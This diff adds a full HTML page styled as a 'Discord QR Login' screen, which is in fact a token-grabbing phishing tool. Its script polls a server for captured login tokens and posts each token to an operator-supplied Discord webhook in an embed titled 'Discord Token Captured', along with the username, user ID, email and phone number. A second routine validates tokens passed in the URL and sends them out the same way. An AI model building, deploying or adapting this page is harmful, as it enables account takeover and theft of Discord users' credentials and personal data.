@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord QR Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: #313338; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+        }
+        .container {
+            background: #1e1f22;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .logo {
+            font-size: 48px;
+            color: #5865F2;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #dbdee1;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #b5bac1;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        #qr {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .status {
+            color: #dbdee1;
+            font-size: 14px;
+            margin-top: 12px;
+        }
+        .status .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #23a55a;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .input-group label {
+            color: #b5bac1;
+            font-size: 12px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #3f4147;
+            background: #1e1f22;
+            color: #dbdee1;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #5865F2;
+        }
+        .btn {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background: #4752c4;
+        }
+        #qr-container {
+            display: none;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .webhook-status {
+            color: #23a55a;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+        .webhook-status.error {
+            color: #ed4245;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">💬</div>
+        <h2>Discord QR Login</h2>
+        <p>Scan with Discord mobile app to login</p>
+        
+        <div id="setup">
+            <div class="input-group">
+                <label>Webhook URL</label>
+                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." value="">
+            </div>
+            <button class="btn" onclick="generateQR()">Generate QR Code</button>
+            <div id="webhook-status"></div>
+        </div>
+        
+        <div id="qr-container">
+            <div id="qr"></div>
+            <div class="status">
+                <span class="dot"></span>
+                <span id="status-text">Waiting for scan...</span>
+            </div>
+            <div style="margin-top:16px;">
+                <button class="btn" style="background:#ed4245;" onclick="reset()">Reset</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentToken = null;
+        let currentUser = null;
+        let qrCode = null;
+        let intervalId = null;
+
+        function generateQR() {
+            const webhook = document.getElementById('webhook').value.trim();
+            if (!webhook) {
+                const status = document.getElementById('webhook-status');
+                status.textContent = 'Please enter a webhook URL';
+                status.className = 'webhook-status error';
+                return;
+            }
+            
+            if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+                const status = document.getElementById('webhook-status');
+                status.textContent = 'Invalid webhook URL';
+                status.className = 'webhook-status error';
+                return;
+            }
+
+            const url = window.location.href;
+            document.getElementById('setup').style.display = 'none';
+            document.getElementById('qr-container').style.display = 'block';
+            
+            if (qrCode) {
+                qrCode.clear();
+                qrCode.makeCode(url);
+            } else {
+                qrCode = new QRCode(document.getElementById('qr'), {
+                    text: url,
+                    width: 200,
+                    height: 200,
+                    colorDark: '#000000',
+                    colorLight: '#ffffff',
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+            }
+            
+            document.getElementById('status-text').textContent = 'Waiting for scan...';
+            
+            if (intervalId) clearInterval(intervalId);
+            
+            intervalId = setInterval(async () => {
+                try {
+                    const response = await fetch('/check');
+                    const data = await response.json();
+                    
+                    if (data.token) {
+                        clearInterval(intervalId);
+                        document.getElementById('status-text').textContent = '✅ Logged in!';
+                        currentToken = data.token;
+                        currentUser = data.user;
+                        
+                        if (currentUser) {
+                            const embed = {
+                                embeds: [{
+                                    title: 'Discord Token Captured',
+                                    color: 0x5865F2,
+                                    fields: [
+                                        { name: 'Token', value: '```' + currentToken + '```', inline: false },
+                                        { name: 'Username', value: currentUser.username + '#' + currentUser.discriminator, inline: true },
+                                        { name: 'User ID', value: currentUser.id, inline: true }
+                                    ]
+                                }]
+                            };
+                            
+                            if (currentUser.email) {
+                                embed.embeds[0].fields.push({ name: 'Email', value: currentUser.email, inline: true });
+                            }
+                            if (currentUser.phone) {
+                                embed.embeds[0].fields.push({ name: 'Phone', value: currentUser.phone, inline: true });
+                            }
+                            
+                            fetch(webhook, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(embed)
+                            });
+                            
+                            document.getElementById('status-text').textContent = '✅ Token sent to webhook!';
+                        }
+                    }
+                } catch(e) {
+                    // Ignore errors
+                }
+            }, 1000);
+        }
+
+        function reset() {
+            if (intervalId) clearInterval(intervalId);
+            document.getElementById('setup').style.display = 'block';
+            document.getElementById('qr-container').style.display = 'none';
+            document.getElementById('webhook-status').textContent = '';
+            document.getElementById('webhook-status').className = 'webhook-status';
+            if (qrCode) {
+                qrCode.clear();
+            }
+            currentToken = null;
+            currentUser = null;
+        }
+
+        // Check for token in URL
+        (function checkToken() {
+            const params = new URLSearchParams(window.location.search);
+            const token = params.get('token');
+            
+            if (token) {
+                fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                })
+                .then(res => res.json())
+                .then(user => {
+                    if (user.id) {
+                        const webhook = localStorage.getItem('webhook');
+                        if (webhook) {
+                            const embed = {
+                                embeds: [{
+                                    title: 'Discord Token Captured',
+                                    color: 0x5865F2,
+                                    fields: [
+                                        { name: 'Token', value: '```' + token + '```', inline: false },
+                                        { name: 'Username', value: user.username + '#' + user.discriminator, inline: true },
+                                        { name: 'User ID', value: user.id, inline: true }
+                                    ]
+                                }]
+                            };
+                            
+                            fetch(webhook, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(embed)
+                            });
+                        }
+                    }
+                })
+                .catch(() => {});
+            }
+        })();
+
+        // Save webhook for token capture
+        document.getElementById('webhook').addEventListener('change', function() {
+            localStorage.setItem('webhook', this.value);
+        });
+
+        // Load saved webhook
+        const savedWebhook = localStorage.getItem('webhook');
+        if (savedWebhook) {
+            document.getElementById('webhook').value = savedWebhook;
+        }
+    </script>
+</body>
+</html>
